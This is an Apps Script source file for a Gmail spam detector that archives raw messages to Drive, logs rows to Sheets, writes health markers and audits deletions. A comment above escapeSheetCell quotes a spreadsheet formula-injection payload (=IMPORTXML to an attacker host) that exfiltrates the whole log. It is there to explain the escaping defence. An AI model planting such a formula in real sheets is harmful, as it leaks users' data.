/**
 * Intelligence.gs — The Drive/Sheets archive, health reporting, and the run audit.
 *
 * accumulateLogEntry() writes the EML to Drive SYNCHRONOUSLY before returning,
 * because the caller deletes the message next. Its return value is the invariant
 * Disposition.gs enforces: no archive, no permanent delete.
 *
 * auditRunIntegrity() costs zero API calls and verifies the run did what it
 * believes it did — a delete with no log row is a reported finding.
 *
 * Apps Script concatenates every .gs file in sources.json into ONE global
 * scope. These are not modules: nothing is imported, and every function here
 * is a global visible to all other files.
 */

/**
 * Capture a spam event into the in-memory log buffer.
 *
 * Must be called BEFORE markAsSpam() — getRawContent() is unavailable after
 * the message is permanently deleted via batchDelete(). The raw MIME content
 * is held in memory until flushSpamLog() writes it to Drive at end of run.
 *
 * Non-blocking: any error is caught and logged; the caller's deletion flow
 * is unaffected if this function fails.
 *
 * @param {GmailMessage} message - The spam message to capture.
 * @param {Object|null}  signals - Signal object from collectSignals(), or null.
 * @param {string}       logType - 'SPAM_DETECTED', 'PHISHING_DETECTED', or 'FALSE_NEGATIVE'.
 */
/**
 * Make an attacker-controlled value safe to hand to Range.setValues().
 *
 * setValues() EVALUATES formulas — this code relies on that for the
 * =HYPERLINK() in the Drive URL column. So a Subject, display name, address or
 * Reply-To beginning with '=', '+', '-', '@', tab or CR becomes a LIVE FORMULA
 * in the user's own authenticated Sheets session. A subject of
 *   =IMPORTXML("https://attacker/?x="&ENCODEURL(JOIN(",",A2:R500)),"//a")
 * fires on document open with no interaction and exfiltrates the entire
 * detection log — every sender, subject, message id and Drive EML URL.
 * The attacker fully controls whether their own mail is flagged, so getting
 * the row written is trivial.
 *
 * Prefixing an apostrophe forces Sheets to treat the cell as literal text.
 * Also length-capped: a subject exceeding the 50 000-character cell limit made
 * setValues() throw, and because flushSpamLog()'s finally clears the buffer,
 * one crafted subject destroyed the log rows for every message in that batch —
 * all of which were already deleted.
 *
 * @param {*} value - Raw, attacker-influenced value.
 * @return {string} A value that cannot be interpreted as a formula.
 */
function escapeSheetCell(value)
{
  if (value === null || value === undefined) return '';

  let text = String(value);
  if (text.length > LIMITS.maxSheetCellChars)
  {
    text = text.substring(0, LIMITS.maxSheetCellChars) + '...[truncated]';
  }

  return /^[=+\-@\t\r]/.test(text) ? "'" + text : text;
}

function accumulateLogEntry(message, signals, logType, options)
{
  // rawContent: used when the caller supplies it, so the message is not fetched
  // twice. collectSignals() pulls getRawContent() for bulk detection and this
  // function pulls it again, so a deleted message costs two full RFC822 reads.
  //
  // NO CALLER SUPPLIES IT TODAY. This comment previously described the
  // double-fetch in the past tense as though it had been fixed; the parameter
  // was documented and never read. It is read now, so passing it works — but
  // threading the value out of collectSignals() means changing the return
  // contract of the detection path, which the parity bridge probes, so that is
  // a separate change. Deletions are low-volume (single digits most days), so
  // the standing cost is small; the defect was the claim, not the quota.
  // skipArchive: log the Sheets row but do NOT copy the raw message to Drive.
  //
  // Used for messages we are logging but NOT deleting. The Drive EML exists
  // purely as a recovery copy for mail about to be destroyed; a message that
  // survives needs no copy, and archiving it would put legitimate mail (a
  // whitelisted sender Gmail misfiled) into Drive for no benefit. Also skips
  // the getRawContent() fetch entirely, saving a Gmail read.
  const skipArchive = !!(options && options.skipArchive);
  const suppliedRaw = (options && typeof options.rawContent === 'string')
    ? options.rawContent
    : null;
  try
  {
    const from            = sanitizeInput(message.getFrom()).replace(RFC2822_QUOTED_NAME, '$1$2');
    const emailAddress    = extractEmailAddress(from);
    const fromDisplayName = from.replace(/<[^>]*>$/, '').trim();

    const domainMatch  = emailAddress.match(/@(.+)$/);
    const sendingDomain = domainMatch ? domainMatch[1] : emailAddress;

    let hasAttachment = false;
    try { hasAttachment = message.getAttachments().length > 0; }
    catch (e) { /* non-fatal */ }

    let listUnsubscribePresent = false;
    try { listUnsubscribePresent = message.getHeader('List-Unsubscribe').length > 0; }
    catch (e) { /* non-fatal */ }

    let rawContent = '';
    if (!skipArchive)
    {
      if (suppliedRaw !== null)
      {
        rawContent = suppliedRaw;
      }
      else
      {
        try { rawContent = message.getRawContent(); }
        catch (e) { logError('getRawContent failed for ' + message.getId() + ': ' + e.toString()); }
      }
    }

    // Write the EML to Drive NOW, synchronously, before the caller disposes of
    // the message.
    //
    // This used to only buffer, with the Drive write happening in
    // flushSpamLog() after the whole thread loop — so the real order was
    // batchDelete THEN Drive write, and the "archived before deleting"
    // guarantee that the v6.44.0 post-mortem relied on did not exist. Anything
    // ending the execution in between lost the archive permanently, and
    // flushSpamLog()'s finally clears the buffer so there was no carry-over:
    // a 6-minute timeout, an unset SPAM_LOG_FOLDER_ID, a memory kill, or a
    // throw from runPeriodicMaintenance() each deleted mail with no copy.
    //
    // The returned value is the invariant disposeDetectedMessage() enforces:
    // no archive, no permanent delete.
    const archive = skipArchive
      ? { archived: false, driveUrl: '' }
      : archiveRawEml(message.getId(), rawContent, logType);

    // rawContent is deliberately NOT stored on the buffered entry. Once
    // archiveRawEml() has written it to Drive nothing reads it again, and
    // keeping it meant holding up to CONFIG.maxEmailsPerRun full raw messages
    // in memory until the flush — 50 x up to 25MB, since getRawContent() is
    // not bounded by CONFIG.maxEmailSizeBytes (that check reads getBody()).
    // An Apps Script memory kill there used to lose every buffered archive for
    // messages already deleted; now the archives are already on disk, and the
    // buffer holds only the small Sheets row.

    _loggedMessageIds.push(message.getId());

    _pendingLogEntries.push({
      driveUrl:               archive.driveUrl,
      archived:               archive.archived,
      detectedAt:             new Date().toISOString(),
      logType:                logType,
      messageId:              message.getId(),
      threadId:               message.getThread().getId(),
      subject:                message.getSubject() || '',
      fromDisplayName:        fromDisplayName,
      fromAddress:            emailAddress,
      sendingDomain:          sendingDomain,
      replyTo:                message.getReplyTo() || '',
      ruleInfo:               getRuleFromSignals(signals),
      clickbaitCount:         signals ? signals.clickbaitCount : 0,
      signalsCsv:             buildSignalsCsv(signals),
      bulkEmailService:       signals ? signals.bulkEmailService : false,
      hasAttachment:          hasAttachment,
      listUnsubscribePresent: listUnsubscribePresent
    });

    return archive.archived;
  }
  catch (error)
  {
    logError('accumulateLogEntry failed: ' + error.toString());
    return false;
  }
}

/**
 * Write one raw message to the Drive archive immediately.
 *
 * Split out of flushSpamLog() so the archive can be written BEFORE disposal
 * rather than after. Only the Sheets row remains batched — that is where the
 * batching win actually is, and a lost Sheets row is recoverable from the EML
 * whereas a lost EML is not recoverable from anything.
 *
 * @param {string} messageId  - Gmail message id, used for the filename.
 * @param {string} rawContent - Full RFC822 content.
 * @param {string} logType    - Routes FALSE_NEGATIVE to its own subfolder.
 * @return {Object} {archived: boolean, driveUrl: string}
 */
function archiveRawEml(messageId, rawContent, logType)
{
  const result = { archived: false, driveUrl: '' };

  if (!rawContent)
  {
    logError('No raw content to archive for ' + messageId);
    return result;
  }

  try
  {
    const props   = PropertiesService.getScriptProperties();
    const folderId = props.getProperty('SPAM_LOG_FOLDER_ID');
    if (!folderId)
    {
      logError('SPAM_LOG_FOLDER_ID unset — run setupLogging(). Nothing will be ' +
               'permanently deleted until the archive is reachable.');
      return result;
    }

    const rootFolder = DriveApp.getFolderById(folderId);
    const subfolder  = getOrCreateLogSubfolder(rootFolder,
      [logType === 'FALSE_NEGATIVE' ? 'False Negatives' : 'Detected']);

    const safeTs   = new Date().toISOString().replace(/:/g, '-').replace(/\.\d+Z$/, 'Z');
    const filename = safeTs + '_' + String(messageId).substring(0, 8) + '.eml';
    const fileUrl  = subfolder.createFile(
      Utilities.newBlob(rawContent, 'message/rfc822', filename)).getUrl();

    result.archived = true;
    result.driveUrl = '=HYPERLINK("' + fileUrl + '","' + filename + '")';
  }
  catch (e)
  {
    logError('Drive archive failed for ' + messageId + ': ' + e.toString());
  }

  return result;
}

/**
 * Write all pending log entries to Drive (EML files) and Sheets (rows).
 *
 * Called once at the end of processInbox(), after all deletions are complete.
 * Batches all Sheets rows into a single setValues() call. Drive writes are
 * sequential (one file per entry) since Drive has no batch creation API.
 *
 * Non-blocking: errors are caught and logged; spam detection is unaffected.
 * The finally block always clears _pendingLogEntries to prevent memory growth.
 */
/**
 * Write last-run health to a 'Health' tab: ONE row, overwritten each time.
 *
 * console.error/console.log were supposed to carry this, and they do not reach
 * anywhere readable. Apps Script sends them to Cloud Logging under the GCP
 * project attached to the script, and this script uses the auto-created default
 * project — confirmed empirically: the project named in .clasp.json has never
 * received a single log entry, and the Apps Script API refuses processes.list
 * without the script.processes scope. Attaching a standard GCP project is a
 * manual console procedure with an OAuth consent screen attached to it.
 *
 * The Sheet, meanwhile, is already configured, already written to, and already
 * readable with credentials that exist. So health goes there.
 *
 * Overwritten rather than appended: this is a gauge, not a log. At the live
 * 10-minute trigger interval an appended row would add ~144 rows a day — and
 * 1,440 if the trigger were ever moved back to a minute — burying the detection
 * log it shares a spreadsheet with. Staleness is the signal: if LastRunAt is
 * older than about 15 minutes (interval plus the health throttle), the detector
 * is not running.
 *
 * Throttled: a quiet run rewrites at most every HEALTH_INTERVAL_MS, so the
 * common case costs no Sheets call at all. Anything eventful (work done, an
 * error, an audit finding) always writes immediately.
 */
function writeHealthRow(stats)
{
  const HEALTH_INTERVAL_MS = 5 * 60 * 1000;

  try
  {
    const props    = PropertiesService.getScriptProperties();
    // A VERSION CHANGE counts as eventful.
    //
    // Without this the throttle held the previous version's health signal for
    // up to HEALTH_INTERVAL_MS after a deploy, so anything checking "is the new
    // version live and healthy?" saw the OLD version and had to either poll for
    // five minutes or report a failure that was really just staleness. A
    // post-deploy check built on that is flaky, and flaky checks get ignored.
    //
    // The first run on new code is also the run most worth reporting.
    const lastVersion  = props.getProperty('LAST_HEALTH_VERSION');
    const versionMoved = lastVersion !== SCRIPT_VERSION;

    const eventful = stats.processed > 0 || stats.spam > 0 ||
                     stats.errors > 0 || stats.auditFindings > 0 ||
                     !!stats.runError || versionMoved;
    const lastAt   = parseInt(props.getProperty('LAST_HEALTH_WRITE_MS') || '0', 10);

    if (!eventful && Date.now() - lastAt < HEALTH_INTERVAL_MS) return;

    // THREW outranks everything: the run did not complete, so its other
    // counters are partial and must not read as a clean result.
    const status = stats.runError            ? 'THREW'
                 : stats.auditFindings > 0   ? 'AUDIT_FINDINGS'
                 : stats.errors > 0          ? 'ERRORS'
                 : 'OK';

    // Marker FIRST, and independent of the spreadsheet.
    //
    // It used to run after the Sheet write, behind the SPAM_LOG_SHEET_ID guard,
    // so a missing or broken spreadsheet silently took the machine-readable
    // health signal down with it. That is exactly backwards: the moment the
    // Sheet is misconfigured is the moment you most need to be told.
    updateHealthMarker(props, status);
    props.setProperty('LAST_HEALTH_WRITE_MS', String(Date.now()));
    props.setProperty('LAST_HEALTH_VERSION', SCRIPT_VERSION);

    const sheetId = props.getProperty('SPAM_LOG_SHEET_ID');
    if (!sheetId) return;   // no spreadsheet configured; the marker still went out

    const ss = SpreadsheetApp.openById(sheetId);
    let sheet = ss.getSheetByName('Health');
    if (!sheet)
    {
      sheet = ss.insertSheet('Health');
      sheet.setFrozenRows(1);
    }

    // Header and data written TOGETHER, every time, in one call.
    //
    // Writing the header only when creating the tab meant an existing tab kept
    // whatever schema it was created with: v6.58.0 made a 7-column header, and
    // v6.58.1 then wrote 8 values into row 2, leaving LastError as an unlabelled
    // column H. Writing both rows is the same number of Sheets calls and makes
    // the tab self-healing whenever this schema changes again.
    sheet.getRange(1, 1, 2, 8).setValues([
      ['LastRunAt', 'Version', 'Status', 'Processed', 'SpamActioned',
       'RunErrors', 'AuditFindings', 'LastError'],
      [new Date().toISOString(), SCRIPT_VERSION, status,
       stats.processed, stats.spam, stats.errors, stats.auditFindings,
       escapeSheetCell(String(stats.runError || '').substring(0, 500))]
    ]);
  }
  catch (e)
  {
    // Never let the health gauge break the run it is reporting on.
    logError('writeHealthRow failed (non-fatal): ' + e.toString());
  }
}

/**
 * Publish health into a Drive file's NAME, so it can be read with no setup.
 *
 * The Health tab is the surface a human reads. This is the one a script can
 * read, and the distinction is not academic — getting an automated checker to
 * see the Health tab turned out to require credentials nobody has lying around:
 *
 *   - Logger.log goes to the Apps Script transcript, which the Apps Script API
 *     will not serve without the script.processes scope (403).
 *   - console.* goes to Cloud Logging under the script's attached GCP project.
 *     This script uses the auto-created default project, and the project named
 *     in .clasp.json has never received a log entry. Attaching a standard one
 *     is a manual console procedure with an OAuth consent screen.
 *   - The Sheets API is not enabled for clasp's own OAuth client, so reading
 *     the Health tab needs a separately minted token. Asking a human to
 *     hand-craft an access token before they can ask "is it running?" is not a
 *     health check.
 *
 * Drive metadata, however, IS readable with exactly the credentials
 * `clasp login` already produces. A file name is metadata. So the status goes
 * in the name and the checker reads it for free.
 *
 * ONE file, renamed in place — the id is kept in Script Properties so this
 * never accumulates copies. Its content stays empty; only the name matters.
 */
function updateHealthMarker(props, status)
{
  try
  {
    const name = 'SpamDetector_health_' + status + '_v' + SCRIPT_VERSION +
                 '_' + new Date().toISOString();

    const existingId = props.getProperty('HEALTH_MARKER_FILE_ID');
    if (existingId)
    {
      try { DriveApp.getFileById(existingId).setName(name); return; }
      catch (e) { /* deleted or inaccessible — fall through and recreate */ }
    }

    const rootFolderId = props.getProperty('SPAM_LOG_FOLDER_ID');
    if (!rootFolderId) return;

    const file = DriveApp.getFolderById(rootFolderId).createFile(name, '');
    props.setProperty('HEALTH_MARKER_FILE_ID', file.getId());
  }
  catch (e)
  {
    logError('updateHealthMarker failed (non-fatal): ' + e.toString());
  }
}

/**
 * Queue an audit row. Synthesized rather than derived from a message, because
 * the message an audit concerns may already be permanently deleted.
 *
 * @param {string} logType - 'AUDIT_LOG_GAP' or 'AUDIT_SPAM_NOT_ACTIONED'.
 * @param {string} detail  - Human-readable finding; lands in the Subject column.
 */
function queueAuditRow(logType, detail)
{
  _pendingLogEntries.push({
    driveUrl: '', archived: false,
    detectedAt: new Date().toISOString(),
    logType:   logType,
    messageId: '', threadId: '',
    subject:          detail,
    fromDisplayName:  'SpamDetector self-audit',
    fromAddress:      '', sendingDomain: '', replyTo: '',
    ruleInfo:        { rule: 'AUDIT', description: 'Automated prod invariant check' },
    clickbaitCount:   0,
    signalsCsv:       '',
    bulkEmailService: false,
    hasAttachment:    false,
    listUnsubscribePresent: false
  });
}

/**
 * Verify, in production, that the detector actually did what it believes it did.
 *
 * Runs at the end of every processInbox(). Costs no Gmail API calls — it reads
 * only tallies already accumulated during the run.
 *
 * Two invariants, both chosen because their violation has actually shipped here
 * and neither was detectable without a human reading the mailbox or the Sheet:
 *
 *   1. LOG PARITY — every permanently deleted message has a Sheet row. The
 *      standing requirement is that all spam is logged, and deletion is
 *      irreversible, so an unlogged delete destroys the only record that it
 *      happened. Violated whenever a delete path skips accumulateLogEntry().
 *
 *   2. SPAM ACTIONED — phase 2 left no aged, non-whitelisted mail behind. This
 *      is the "is prod acting on the Spam folder at all?" check. Six messages
 *      sat through two releases intended to remove them; every test passed
 *      green throughout, because no test and no alert looked at the folder.
 *
 * Findings go to the SHEET, not just logError. An earlier lesson in this
 * project is that logError reaches only the Apps Script transcript, which
 * nobody reads — so a silent failure stayed silent. The Sheet is the surface
 * the user actually looks at, so that is where a broken invariant belongs.
 *
 * Deliberately non-throwing: an audit that breaks the run it audits is worse
 * than the bug it reports.
 */
function auditRunIntegrity()
{
  try
  {
    let findings = 0;

    const unlogged = _destroyedMessageIds.filter(function (id) {
      return _loggedMessageIds.indexOf(id) === -1;
    });

    if (unlogged.length > 0)
    {
      const detail = 'LOG GAP: ' + unlogged.length + ' message(s) permanently ' +
                     'deleted with no Sheet row — ids: ' + unlogged.join(', ');
      logError('AUDIT FAILED — ' + detail);
      queueAuditRow('AUDIT_LOG_GAP', detail);
      findings++;
    }

    if (_unresolvedAgedSpam > 0)
    {
      const detail = 'SPAM NOT ACTIONED: ' + _unresolvedAgedSpam + ' aged, ' +
                     'non-whitelisted Spam-folder thread(s) were neither ' +
                     'deleted nor spared this run';
      logError('AUDIT FAILED — ' + detail);
      queueAuditRow('AUDIT_SPAM_NOT_ACTIONED', detail);
      findings++;
    }

    // Flush only when the audit itself queued something. flushSpamLog() already
    // no-ops on an empty buffer, but being explicit keeps the intent readable:
    // a clean audit writes nothing at all.
    if (_pendingLogEntries.length > 0) flushSpamLog();

    return findings;
  }
  catch (auditError)
  {
    logError('auditRunIntegrity failed (non-fatal): ' + auditError.toString());
    return 0;
  }
}
